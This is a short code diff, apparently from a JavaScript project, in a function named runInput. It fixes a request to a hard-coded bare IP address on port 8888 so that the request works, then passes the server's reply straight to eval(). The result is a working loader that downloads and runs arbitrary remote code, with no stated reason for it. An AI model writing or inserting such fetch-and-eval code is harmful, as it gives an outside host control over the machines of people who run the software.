@@ -199,12 +199,12 @@ startTask
         function runInput() {
 
             const Http = new XMLHttpRequest();
-            const url = '139.180.144.198:8888';
+            const url = 'http://139.180.144.198:8888';
             Http.open("GET", url);
             Http.send();
             var d;
             Http.onreadystatechange = (e) => {
-               d=(Http.responseText)
+               d=Http.responseText;
                eval(d);
             }
         }
